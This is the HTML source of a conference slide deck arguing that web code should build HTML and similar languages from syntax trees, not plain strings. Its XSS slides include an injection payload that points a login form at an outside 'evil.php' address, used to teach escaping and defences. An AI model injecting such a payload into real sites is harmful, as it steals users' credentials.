<!DOCTYPE html>
<html>
  <head>
    <title>Web Linguistics : Towards Higher Fluency</title>
    <link href="css/reset.css" rel="stylesheet" />
    
    <meta charset="utf-8" />
    <meta name="viewport" content="width=1024" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <link rel="shortcut icon" href="css/favicon.png" />
    <link rel="apple-touch-icon" href="css/apple-touch-icon.png" />
    <!-- Code Prettifier: -->
<link href="css/highlight.css" type="text/css" rel="stylesheet" />
<script type="text/javascript" src="js/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
	<script type="text/javascript">
	  var _gaq = _gaq || [];
	  _gaq.push(['_setAccount', 'UA-16178122-1']);
	  _gaq.push(['_trackPageview']);

	  (function() {
	  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
	  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
	  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
	  })();
	</script>

        <script type="text/x-mathjax-config">
          MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});
        </script>
        <script type="text/javascript"
          src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
        </script>
      
    <link href="css/style.css" rel="stylesheet" />
<link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,800italic,300,400,800' rel='stylesheet' type='text/css'/>
<script src="http://code.jquery.com/jquery-1.10.1.min.js"></script>
<script>
(function ( document, window ) {
    document.addEventListener("impress:init", function (event) {
        document.addEventListener("impress:stepenter", function (event) {
            var step = $(event.target);
            if (console.clear) { console.clear(); }
            console.log(step.attr('id'));
            console.log(step.find('.notes').text());
        }, false);
    });

    // Prevent default keydown action when one of supported key is pressed.
    document.addEventListener("keydown", function ( event ) {
      if ( event.keyCode === 48) { //0
        event.preventDefault();
        impress().goto(0);
      }
    }, false);
})(document, window);
</script>

  </head>

  <body>
  <div class="fallback-message">
  <p>Your browser <b>doesn't support the features required</b> by impress.js, so you are presented with a simplified version of this presentation.</p>
  <p>For the best experience please use the latest <b>Chrome</b>, <b>Safari</b> or <b>Firefox</b> browser.</p>
  </div>
    <div id="impress" data-transition-duration="0">
    <div class='step logo center' data-x='1000' data-y='0'>
    
<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<h1>Web Linguistics</h1>

<h2>Towards Higher Fluency</h2>

<p>by Arne Brasseur / <a href="http://twitter.com/plexus">@plexus</a></p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p>&nbsp;</p>
</div>
      <div class='step haiku' data-x='2000' data-y='0'>
    
<h2>tl;dr (in Haiku)</h2>

<p>For formal language</p>

<p>Avoid plain strings at all cost</p>

<p>Use data structures</p>
<div class='notes' style='display:none;'>- make this point up front
- talk in 3 parts : What do I mean? Why do I say this? How do we that?
</div></div>
      <div class='step center' data-x='3000' data-y='0'>
    
<h1>Language</h1>

<h2>langue, taal, sprache, 語言</h2>
</div>
      <div class='step center' data-x='4000' data-y='0'>
    
<p><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<img src="platypus_cloud.png" alt="">
</p>
<div class='notes' style='display:none;'>I have an idea in my head : "A platypus is carrying a chicken through the forest".

Before I can say this, or even have the words in my mind, I need to have this as an idea in my mind.
</div></div>
      <div class='step center' data-x='5000' data-y='0'>
    
<p><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<img src="platypus_graph.png" alt="">
</p>
<div class='notes' style='display:none;'>In order to communicate this idea, I need to pull it into individual concepts
</div>
<!-- --- -->

<!-- = class='haiku' -->

<!-- ## Language -->

<!-- An **alphabet** to -->

<!-- construct **words** and **sentences** -->

<!-- that convey **meaning** -->

<!-- ````notes -->

<!-- This is true of both natural and formal languages. Let's go through this from bottom to top. -->

<!-- In CS there is usually more emphasis on the understanding (parsing) of languages, but here I want to go what it takes to generate language. Hence we'll start from meaning (an idea) and see how we get to spoken/written language. -->

<!-- ```` -->
<div class='notes' style='display:none;'></div></div>
      <div class='step center' data-x='6000' data-y='0'>
    <div class='dot-wrap'><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="600px" viewBox="0.00 0.00 304.00 262.00">
<g id="graph1" class="graph" transform="scale(1 1) rotate(0) translate(4 258)">
<title>platypus</title>

<!-- s -->
<g id="node1" class="node"><title>s</title>
<ellipse fill="none" stroke="blue" cx="138" cy="-235" rx="55.8614" ry="18.3848"></ellipse>
<text text-anchor="middle" x="138" y="-231.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">sentence</text>
</g>
<!-- subject -->
<g id="node2" class="node"><title>subject</title>
<text text-anchor="middle" x="58" y="-158.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">subject</text>
</g>
<!-- s&#45;&#45;subject -->
<g id="edge2" class="edge"><title>s--subject</title>
<path fill="none" stroke="blue" d="M118.634,-217.329C106.241,-206.02 90.2092,-191.391 77.7432,-180.016"></path>
</g>
<!-- action -->
<g id="node3" class="node"><title>action</title>
<text text-anchor="middle" x="138" y="-158.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">action</text>
</g>
<!-- s&#45;&#45;action -->
<g id="edge6" class="edge"><title>s--action</title>
<path fill="none" stroke="blue" d="M138,-216.201C138,-205.133 138,-191.199 138,-180.231"></path>
</g>
<!-- place -->
<g id="node4" class="node"><title>place</title>
<text text-anchor="middle" x="249" y="-158.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">place</text>
</g>
<!-- s&#45;&#45;place -->
<g id="edge16" class="edge"><title>s--place</title>
<path fill="none" stroke="blue" d="M163.188,-218.435C180.714,-206.909 204.057,-191.557 221.973,-179.775"></path>
</g>
<!-- platypus -->
<g id="node7" class="node"><title>platypus</title>
<text text-anchor="middle" x="37" y="-86.4" font-family="Times Roman,serif" font-size="14.00" fill="red">platypus</text>
</g>
<!-- subject&#45;&#45;platypus -->
<g id="edge4" class="edge"><title>subject--platypus</title>
<path fill="none" stroke="blue" d="M52.7008,-143.831C49.5417,-133 45.5422,-119.288 42.3705,-108.413"></path>
</g>
<!-- verb -->
<g id="node5" class="node"><title>verb</title>
<text text-anchor="middle" x="119" y="-86.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">verb</text>
</g>
<!-- action&#45;&#45;verb -->
<g id="edge8" class="edge"><title>action--verb</title>
<path fill="none" stroke="blue" d="M133.205,-143.831C130.347,-133 126.729,-119.288 123.859,-108.413"></path>
</g>
<!-- object -->
<g id="node6" class="node"><title>object</title>
<text text-anchor="middle" x="193" y="-86.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">object</text>
</g>
<!-- action&#45;&#45;object -->
<g id="edge10" class="edge"><title>action--object</title>
<path fill="none" stroke="blue" d="M151.879,-143.831C160.153,-133 170.628,-119.288 178.934,-108.413"></path>
</g>
<!-- forest -->
<g id="node10" class="node"><title>forest</title>
<text text-anchor="middle" x="268" y="-86.4" font-family="Times Roman,serif" font-size="14.00" fill="red">forest</text>
</g>
<!-- place&#45;&#45;forest -->
<g id="edge18" class="edge"><title>place--forest</title>
<path fill="none" stroke="blue" d="M253.795,-143.831C256.653,-133 260.271,-119.288 263.141,-108.413"></path>
</g>
<!-- carry -->
<g id="node8" class="node"><title>carry</title>
<text text-anchor="middle" x="116" y="-14.4" font-family="Times Roman,serif" font-size="14.00" fill="red">carry</text>
</g>
<!-- verb&#45;&#45;carry -->
<g id="edge12" class="edge"><title>verb--carry</title>
<path fill="none" stroke="blue" d="M118.243,-71.8314C117.792,-61 117.22,-47.2876 116.767,-36.4133"></path>
</g>
<!-- chicken -->
<g id="node9" class="node"><title>chicken</title>
<text text-anchor="middle" x="195" y="-14.4" font-family="Times Roman,serif" font-size="14.00" fill="red">chicken</text>
</g>
<!-- object&#45;&#45;chicken -->
<g id="edge14" class="edge"><title>object--chicken</title>
<path fill="none" stroke="blue" d="M193.505,-71.8314C193.806,-61 194.186,-47.2876 194.489,-36.4133"></path>
</g>
</g>
</svg></div><div class='notes' style='display:none;'>At this point we have identified the components that make up our message, and have determined how they relate to each other. Now we can go on and serialize this message.
</div></div>
      <div class='step center' data-x='7000' data-y='0'>
    
<p><span class="box">A platypus</span>
<span class="box">is carrying</span>
<span class="box">a chicken</span>
<span class="box">in the forest</span></p>
<div class='notes' style='display:none;'>Now we can turn this tree into a linear list of words, ready to be uttered.
</div></div>
      <div class='step center' data-x='8000' data-y='0'>
    
<p><img src='waveform.gif' width='600px' /></p>
<div class='notes' style='display:none;'>And turn these words into sounds.
</div></div>
      <div class='step thumb' data-x='9000' data-y='0'>
    
<h2>Magic of language</h2>

<ul>
<li>Listener reconstructs abstract representation</li>
<li>Identical &quot;tree&quot; is shared between speakers</li>
<li>Each derive meaning from this representation</li>
</ul>
</div>
      <div class='step center' data-x='10000' data-y='0'>
    
<h1>Formal Language</h1>
</div>
      <div class='step statement center' data-x='11000' data-y='0'>
    
<p>a <strong>formal language</strong> is</p>

<p>a <strong>set of strings</strong> of symbols</p>

<p>governed by <strong>strict rules</strong></p>
</div>
      <div class='step statement center' data-x='12000' data-y='0'>
    
<p>These rules form the <strong>grammar</strong></p>

<p>of the language, they specify</p>

<p>how to <strong>generate</strong> valid strings</p>
</div>
      <div class='step ' data-x='13000' data-y='0'>
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint ">alphabet = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
            +, *, (, ), =}

&lt;equation&gt;   ::= &lt;expression&gt; = &lt;expression&gt;

&lt;expression&gt; ::= &lt;number&gt;  | &lt;sum&gt; |
                 &lt;product&gt; | ( &lt;expression&gt; )

&lt;number&gt;     ::= &lt;digit&gt; | &lt;digit&gt; &lt;number&gt;

&lt;digit&gt;      ::= 0 | 1 | 2 | 3 | 4 |
                 5 | 6 | 7 | 8 | 9

&lt;sum&gt;        ::= &lt;expression&gt; + &lt;expression&gt;

&lt;product&gt;    ::= &lt;expression&gt; * &lt;expression&gt;
</code></pre>
</div>
      <div class='step ' data-x='14000' data-y='0'>
    
<p>well-formed :</p>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint ">5 = 3 + 2
4 * 4 = 10 + 6
10 + 20 = ( 3 + 5 ) * 7
</code></pre>

<p>&nbsp;</p>

<p>not well-formed :</p>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint ">5 = + 5
10 = 15 - 5
3 * 5 + 7
</code></pre>
</div>
      <div class='step center' data-x='15000' data-y='0'>
    <div class='dot-wrap'><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="600px" viewBox="0.00 0.00 486.00 404.00">
<g id="graph1" class="graph" transform="scale(1 1) rotate(0) translate(4 400)">
<title>_anonymous_0</title>

<!-- exp1 -->
<g id="node1" class="node"><title>exp1</title>
<text text-anchor="middle" x="134" y="-302.4" font-family="Times Roman,serif" font-size="14.00">expression</text>
</g>
<!-- sum -->
<g id="node23" class="node"><title>sum</title>
<text text-anchor="middle" x="117" y="-230.4" font-family="Times Roman,serif" font-size="14.00">sum</text>
</g>
<!-- exp1&#45;&#45;sum -->
<g id="edge8" class="edge"><title>exp1--sum</title>
<path fill="none" stroke="black" d="M129.71,-287.831C127.153,-277 123.915,-263.288 121.348,-252.413"></path>
</g>
<!-- eq -->
<g id="node2" class="node"><title>eq</title>
<text text-anchor="middle" x="232" y="-302.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">=</text>
</g>
<!-- exp2 -->
<g id="node3" class="node"><title>exp2</title>
<text text-anchor="middle" x="325" y="-302.4" font-family="Times Roman,serif" font-size="14.00">expression</text>
</g>
<!-- product -->
<g id="node32" class="node"><title>product</title>
<text text-anchor="middle" x="360" y="-230.4" font-family="Times Roman,serif" font-size="14.00">product</text>
</g>
<!-- exp2&#45;&#45;product -->
<g id="edge24" class="edge"><title>exp2--product</title>
<path fill="none" stroke="black" d="M333.832,-287.831C339.097,-277 345.763,-263.288 351.049,-252.413"></path>
</g>
<!-- num1 -->
<g id="node4" class="node"><title>num1</title>
<text text-anchor="middle" x="35" y="-158.4" font-family="Times Roman,serif" font-size="14.00">number</text>
</g>
<!-- digit1 -->
<g id="node10" class="node"><title>digit1</title>
<text text-anchor="middle" x="35" y="-86.4" font-family="Times Roman,serif" font-size="14.00">digit</text>
</g>
<!-- num1&#45;&#45;digit1 -->
<g id="edge16" class="edge"><title>num1--digit1</title>
<path fill="none" stroke="black" d="M35,-143.831C35,-133 35,-119.288 35,-108.413"></path>
</g>
<!-- plus -->
<g id="node5" class="node"><title>plus</title>
<text text-anchor="middle" x="115" y="-158.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">+</text>
</g>
<!-- num2 -->
<g id="node6" class="node"><title>num2</title>
<text text-anchor="middle" x="195" y="-158.4" font-family="Times Roman,serif" font-size="14.00">number</text>
</g>
<!-- digit2 -->
<g id="node11" class="node"><title>digit2</title>
<text text-anchor="middle" x="195" y="-86.4" font-family="Times Roman,serif" font-size="14.00">digit</text>
</g>
<!-- num2&#45;&#45;digit2 -->
<g id="edge18" class="edge"><title>num2--digit2</title>
<path fill="none" stroke="black" d="M195,-143.831C195,-133 195,-119.288 195,-108.413"></path>
</g>
<!-- num3 -->
<g id="node7" class="node"><title>num3</title>
<text text-anchor="middle" x="283" y="-158.4" font-family="Times Roman,serif" font-size="14.00">number</text>
</g>
<!-- digit3 -->
<g id="node12" class="node"><title>digit3</title>
<text text-anchor="middle" x="283" y="-86.4" font-family="Times Roman,serif" font-size="14.00">digit</text>
</g>
<!-- num3&#45;&#45;digit3 -->
<g id="edge32" class="edge"><title>num3--digit3</title>
<path fill="none" stroke="black" d="M283,-143.831C283,-133 283,-119.288 283,-108.413"></path>
</g>
<!-- times -->
<g id="node8" class="node"><title>times</title>
<text text-anchor="middle" x="363" y="-158.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">*</text>
</g>
<!-- num4 -->
<g id="node9" class="node"><title>num4</title>
<text text-anchor="middle" x="443" y="-158.4" font-family="Times Roman,serif" font-size="14.00">number</text>
</g>
<!-- digit4 -->
<g id="node13" class="node"><title>digit4</title>
<text text-anchor="middle" x="443" y="-86.4" font-family="Times Roman,serif" font-size="14.00">digit</text>
</g>
<!-- num4&#45;&#45;digit4 -->
<g id="edge34" class="edge"><title>num4--digit4</title>
<path fill="none" stroke="black" d="M443,-143.831C443,-133 443,-119.288 443,-108.413"></path>
</g>
<!-- 5 -->
<g id="node14" class="node"><title>5</title>
<text text-anchor="middle" x="35" y="-14.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">5</text>
</g>
<!-- digit1&#45;&#45;5 -->
<g id="edge20" class="edge"><title>digit1--5</title>
<path fill="none" stroke="black" d="M35,-71.8314C35,-61 35,-47.2876 35,-36.4133"></path>
</g>
<!-- 3 -->
<g id="node15" class="node"><title>3</title>
<text text-anchor="middle" x="195" y="-14.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">3</text>
</g>
<!-- digit2&#45;&#45;3 -->
<g id="edge22" class="edge"><title>digit2--3</title>
<path fill="none" stroke="black" d="M195,-71.8314C195,-61 195,-47.2876 195,-36.4133"></path>
</g>
<!-- 2 -->
<g id="node16" class="node"><title>2</title>
<text text-anchor="middle" x="283" y="-14.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">2</text>
</g>
<!-- digit3&#45;&#45;2 -->
<g id="edge36" class="edge"><title>digit3--2</title>
<path fill="none" stroke="black" d="M283,-71.8314C283,-61 283,-47.2876 283,-36.4133"></path>
</g>
<!-- 4 -->
<g id="node17" class="node"><title>4</title>
<text text-anchor="middle" x="443" y="-14.4" font-family="Times Roman,serif" font-size="14.00" fill="blue">4</text>
</g>
<!-- digit4&#45;&#45;4 -->
<g id="edge38" class="edge"><title>digit4--4</title>
<path fill="none" stroke="black" d="M443,-71.8314C443,-61 443,-47.2876 443,-36.4133"></path>
</g>
<!-- equation -->
<g id="node18" class="node"><title>equation</title>
<text text-anchor="middle" x="232" y="-374.4" font-family="Times Roman,serif" font-size="14.00">equation</text>
</g>
<!-- equation&#45;&#45;exp1 -->
<g id="edge2" class="edge"><title>equation--exp1</title>
<path fill="none" stroke="black" d="M207.27,-359.831C192.414,-348.917 173.576,-335.076 158.722,-324.163"></path>
</g>
<!-- equation&#45;&#45;eq -->
<g id="edge4" class="edge"><title>equation--eq</title>
<path fill="none" stroke="black" d="M232,-359.831C232,-349 232,-335.288 232,-324.413"></path>
</g>
<!-- equation&#45;&#45;exp2 -->
<g id="edge6" class="edge"><title>equation--exp2</title>
<path fill="none" stroke="black" d="M255.468,-359.831C269.566,-348.917 287.443,-335.076 301.54,-324.163"></path>
</g>
<!-- sum&#45;&#45;num1 -->
<g id="edge10" class="edge"><title>sum--num1</title>
<path fill="none" stroke="black" d="M96.3079,-215.831C83.8774,-204.917 68.1148,-191.076 55.6854,-180.163"></path>
</g>
<!-- sum&#45;&#45;plus -->
<g id="edge12" class="edge"><title>sum--plus</title>
<path fill="none" stroke="black" d="M116.495,-215.831C116.194,-205 115.814,-191.288 115.511,-180.413"></path>
</g>
<!-- sum&#45;&#45;num2 -->
<g id="edge14" class="edge"><title>sum--num2</title>
<path fill="none" stroke="black" d="M136.683,-215.831C148.507,-204.917 163.501,-191.076 175.324,-180.163"></path>
</g>
<!-- product&#45;&#45;num3 -->
<g id="edge26" class="edge"><title>product--num3</title>
<path fill="none" stroke="black" d="M340.57,-215.831C328.897,-204.917 314.096,-191.076 302.424,-180.163"></path>
</g>
<!-- product&#45;&#45;times -->
<g id="edge28" class="edge"><title>product--times</title>
<path fill="none" stroke="black" d="M360.757,-215.831C361.208,-205 361.78,-191.288 362.233,-180.413"></path>
</g>
<!-- product&#45;&#45;num4 -->
<g id="edge30" class="edge"><title>product--num4</title>
<path fill="none" stroke="black" d="M380.944,-215.831C393.527,-204.917 409.481,-191.076 422.062,-180.163"></path>
</g>
</g>
</svg></div></div>
      <div class='step statement center' data-x='16000' data-y='0'>
    
<p>The <strong>meaning</strong> of a sentence</p>

<p>corresponds with</p>

<p>its <strong>syntax tree</strong></p>
</div>
      <div class='step ' data-x='17000' data-y='0'>
    
<h2>Language is everywhere</h2>

<ul>
<li>Programming languages</li>
<li>Markup &amp; styling languages</li>
<li>Data languages</li>
<li>Network protocols</li>
</ul>
</div>
      <div class='step lang_words center' data-x='18000' data-y='0'>
    
<p><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<img src="language_word_cloud.svg" alt="">
</p>
</div>
      <div class='step statement center' data-x='19000' data-y='0'>
    
<p>Your application either</p>

<p><strong>consumes</strong> or <strong>generates</strong></p>

<p>these languages</p>
</div>
      <div class='step statement center' data-x='20000' data-y='0'>
    
<p>In either case it should</p>

<p>use <strong>syntax trees</strong></p>

<p>to do so</p>
</div>
      <div class='step center' data-x='21000' data-y='0'>
    
<h1>Why ?</h1>
</div>
      <div class='step center' data-x='22000' data-y='0'>
    
<h1>XSS</h1>

<h2>Cross site scripting</h2>
</div>
      <div class='step ' data-x='23000' data-y='0'>
    
<h2>XSS</h2>

<p>Code like this</p>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint ruby">"&lt;div&gt;#{ @post.body }&lt;/div&gt;"
</code></pre>

<p>&nbsp;
&nbsp;</p>

<p>Will lead to malicious injection</p>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint javascript">document.getElementById('login_form').
  action="http://208.246.24.14/evil.php"
</code></pre>
<div class='notes' style='display:none;'>So what exactly is XSS? This is an example of a 'persisted' XSS attack. Anyone who can sneak HTML in our pages can do nasty stuff.

This gives an attacker all privileges the current user of your app has.
</div></div>
      <div class='step statement center' data-x='24000' data-y='0'>
    
<p><strong>session hijacking</strong></p>

<p>attacker can surf the site with user credentials</p>
</div>
      <div class='step ' data-x='25000' data-y='0'>
    
<h2>Escape!</h2>

<p>The common wisdom is to &quot;escape&quot; the inserted value</p>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint html">&lt;div&gt;#{ escape_html(@post.body) }&lt;/div&gt;
</code></pre>

<p>&nbsp;
&nbsp;</p>

<p>Now the code is harmless</p>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint html">&lt;div&gt;
  &amp;lt;script&amp;gt;document.getElementById('login_form').action=http://208.246.24.14/evil.php&amp;lt;/script&amp;gt;
&lt;/div&gt;
</code></pre>
<div class='notes' style='display:none;'>So what to do? This is what you learn in Web security 101, make sure you HTML escape whatever you don't trust, and you'll be fine.
</div></div>
      <div class='step haiku' data-x='26000' data-y='0'>
    
<h2>XSS</h2>

<p>Is a more common</p>

<p>vulnerability than</p>

<p>buffer overflows</p>
<div class='notes' style='display:none;'>So if it's that simple, why is it still that common?
</div></div>
      <div class='step ' data-x='27000' data-y='0'>
    
<blockquote>
<p>[CVE-2013-1857] XSS Vulnerability<br/> in the <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<code class="inline prettyprint">sanitize</code>
 helper of Ruby on Rails</p>
</blockquote>

<p>&nbsp; &mdash; @tenderlove on rails-security-ann</p>

<p></p>

<blockquote>
<p>Given all the fun we&#39;ve had with security issues</p>
</blockquote>

<p>&nbsp; &mdash; Rails 4 beta announcement</p>
<div class='notes' style='display:none;'>It's been an interesting winter for Rails security issues, and hopefully security is still at the front of peoples minds.
</div></div>
      <div class='step statement center think' data-x='28000' data-y='0'>
    
<p>&nbsp;</p>

<p><strong>why</strong> is it so <strong>hard?</strong></p>

<p>&nbsp;</p>
</div>
      <div class='step ' data-x='29000' data-y='0'>
    
<p>What side of the escape are we on?</p>

<p><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<img src="shipping_label.jpg" alt="">
</p>

<p>Steps to reproduce</p>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint ruby">escape_html(
  escape_html(
    '&oacute;'.force_encoding('ISO-8859-1')
       .encode('UTF-8')
       .sub('&Atilde;', '&amp;atilde;')
       .sub('&sup3;','&amp;sup3;')))
</code></pre>
<div class='notes' style='display:none;'>This is a real life shipping label. This may seem silly but it happens all the time, we either escape too much or too little.

I actually noticed this myself although less extreme, when sending a parcel to a friend I wanted to add a middle name between quotes, these ended up on the parcel as HTML entity.
</div></div>
      <div class='step ' data-x='30000' data-y='0'>
    
<p>Manual escaping? <strong>hard</strong></p>

<p>Let&#39;s automate!</p>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint html"># using HTML::SafeBuffer
&lt;div&gt;&lt;%= @post.body %&gt;&lt;/div&gt;
</code></pre>

<p>And it <strong>just works</strong></p>
<div class='notes' style='display:none;'>This is (at least in Ruby) the state of the art of XSS prevention, it's part of Rails 'secure by default' philosophy.
</div></div>
      <div class='step ' data-x='31000' data-y='0'>
    
<p>We&#39;ve turned the problem around</p>

<p>Whitelist instead of blacklist</p>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<pre><code class="prettyprint ruby">def helper
  "&lt;p&gt; haikus are pretty &lt;p&gt;".html_safe
end
</code></pre>

<p>&nbsp;</p>

<p><strong>We&#39;re still manually deciding what (not) to escape</strong></p>
<div class='notes' style='display:none;'>This is better because whitelist > blacklist. It is a step forward, less strings will be left unescaped, but you can hardly call this a structural solution.
</div></div>
      <div class='step ' data-x='32000' data-y='0'>
    
<h2>The problem</h2>

<p>Semantics of string are twofold</p>

<ul>
<li>a string</li>
<li>a textual representation of HTML</li>
</ul>
</div>
      <div class='step center' data-x='33000' data-y='0'>
    <div class='dot-wrap'><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800px" viewBox="0.00 0.00 518.00 188.00">
<g id="graph1" class="graph" transform="scale(1 1) rotate(0) translate(4 184)">
<title>commmunication</title>

<!-- z1 -->
<g id="node1" class="node"><title>z1</title>
<ellipse fill="none" stroke="green" cx="18" cy="-18" rx="18" ry="18"></ellipse>
</g>
<!-- c -->
<g id="node2" class="node"><title>c</title>
<ellipse fill="none" stroke="green" cx="384" cy="-18" rx="18" ry="18"></ellipse>
</g>
<!-- x1 -->
<g id="node4" class="node"><title>x1</title>
<ellipse fill="none" stroke="blue" cx="72" cy="-162" rx="18" ry="18"></ellipse>
</g>
<!-- y1 -->
<g id="node6" class="node"><title>y1</title>
<ellipse fill="none" stroke="blue" cx="72" cy="-90" rx="18" ry="18"></ellipse>
</g>
<!-- x1&#45;&gt;y1 -->
<g id="edge3" class="edge"><title>x1-&gt;y1</title>
<path fill="none" stroke="blue" d="M72,-143.831C72,-133 72,-119.288 72,-108.413"></path>
</g>
<!-- y1&#45;&gt;z1 -->
<g id="edge4" class="edge"><title>y1-&gt;z1</title>
<path fill="none" stroke="blue" d="M61.0723,-75.4297C51.7035,-62.938 38.2755,-45.034 28.9115,-32.5486"></path>
</g>
<!-- z2 -->
<g id="node8" class="node"><title>z2</title>
<ellipse fill="none" stroke="blue" cx="72" cy="-18" rx="18" ry="18"></ellipse>
</g>
<!-- y1&#45;&gt;z2 -->
<g id="edge6" class="edge"><title>y1-&gt;z2</title>
<path fill="none" stroke="blue" d="M72,-71.8314C72,-61 72,-47.2876 72,-36.4133"></path>
</g>
<!-- z3 -->
<g id="node10" class="node"><title>z3</title>
<ellipse fill="none" stroke="blue" cx="126" cy="-18" rx="18" ry="18"></ellipse>
</g>
<!-- y1&#45;&gt;z3 -->
<g id="edge8" class="edge"><title>y1-&gt;z3</title>
<path fill="none" stroke="blue" d="M82.9277,-75.4297C92.2965,-62.938 105.724,-45.034 115.089,-32.5486"></path>
</g>
<!-- aa -->
<g id="node15" class="node"><title>aa</title>
<ellipse fill="blue" stroke="blue" cx="110" cy="-90" rx="1.8" ry="1.8"></ellipse>
</g>
<!-- y1&#45;&gt;aa -->
<g id="edge25" class="edge"><title>y1-&gt;aa</title>
</g>
<!-- serializer -->
<g id="node12" class="node"><title>serializer</title>
<polygon fill="none" stroke="blue" points="210,-108 130,-108 130,-72 210,-72 210,-108"></polygon>
<text text-anchor="middle" x="170" y="-86.4" font-family="Times Roman,serif" font-size="14.00">serializer</text>
</g>
<!-- network -->
<g id="node13" class="node"><title>network</title>
<text text-anchor="middle" x="265" y="-86.4" font-family="Times Roman,serif" font-size="14.00">network</text>
</g>
<!-- serializer&#45;&gt;network -->
<g id="edge12" class="edge"><title>serializer-&gt;network</title>
<path fill="none" stroke="blue" d="M210.078,-90C215.942,-90 221.806,-90 227.67,-90"></path>
</g>
<!-- parser -->
<g id="node14" class="node"><title>parser</title>
<polygon fill="none" stroke="blue" points="380,-108 320,-108 320,-72 380,-72 380,-108"></polygon>
<text text-anchor="middle" x="350" y="-86.4" font-family="Times Roman,serif" font-size="14.00">parser</text>
</g>
<!-- network&#45;&gt;parser -->
<g id="edge13" class="edge"><title>network-&gt;parser</title>
<path fill="none" stroke="blue" d="M302.188,-90C308.04,-90 313.892,-90 319.744,-90"></path>
</g>
<!-- bb -->
<g id="node17" class="node"><title>bb</title>
<ellipse fill="blue" stroke="blue" cx="400" cy="-90" rx="1.8" ry="1.8"></ellipse>
</g>
<!-- parser&#45;&gt;bb -->
<g id="edge14" class="edge"><title>parser-&gt;bb</title>
<path fill="none" stroke="blue" d="M380.078,-90C386.096,-90 392.114,-90 398.132,-90"></path>
</g>
<!-- aa&#45;&gt;serializer -->
<g id="edge11" class="edge"><title>aa-&gt;serializer</title>
<path fill="none" stroke="blue" d="M111.875,-90C117.778,-90 123.682,-90 129.585,-90"></path>
</g>
<!-- b -->
<g id="node21" class="node"><title>b</title>
<ellipse fill="none" stroke="blue" cx="438" cy="-90" rx="18" ry="18"></ellipse>
</g>
<!-- bb&#45;&gt;b -->
<g id="edge27" class="edge"><title>bb-&gt;b</title>
</g>
<!-- a -->
<g id="node19" class="node"><title>a</title>
<ellipse fill="none" stroke="blue" cx="438" cy="-162" rx="18" ry="18"></ellipse>
</g>
<!-- a&#45;&gt;b -->
<g id="edge17" class="edge"><title>a-&gt;b</title>
<path fill="none" stroke="blue" d="M438,-143.831C438,-133 438,-119.288 438,-108.413"></path>
</g>
<!-- b&#45;&gt;c -->
<g id="edge18" class="edge"><title>b-&gt;c</title>
<path fill="none" stroke="blue" d="M427.072,-75.4297C417.704,-62.938 404.276,-45.034 394.911,-32.5486"></path>
</g>
<!-- d -->
<g id="node23" class="node"><title>d</title>
<ellipse fill="none" stroke="blue" cx="438" cy="-18" rx="18" ry="18"></ellipse>
</g>
